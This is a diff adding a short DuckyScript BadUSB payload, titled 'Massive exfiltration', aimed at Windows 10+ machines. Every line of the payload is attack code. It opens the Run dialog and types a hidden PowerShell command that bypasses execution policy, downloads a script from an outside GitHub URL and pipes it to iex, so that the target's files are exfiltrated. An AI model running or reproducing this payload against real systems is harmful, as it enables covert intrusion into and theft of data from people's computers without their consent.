@@ -1,0 +1,9 @@
+REM Title: Massive exfiltration
+REM Description: Use a badusb and usb to massivly exfiltrate targets files
+REM Target OS: Windows 10+
+REM Author: Beigeworm (https://github.com/Beigeworm)
+REM Author of compressed file: SuperJakov (https://github.com/SuperJakov)
+DELAY 500
+GUI r 
+DELAY 500
+STRINGLN powershell -w h -Ep Bypass iwr https://raw.githubusercontent.com/SuperJakov/Badusb/main/massive-exfiltration/no-input-massive-exfil.ps1 | iex
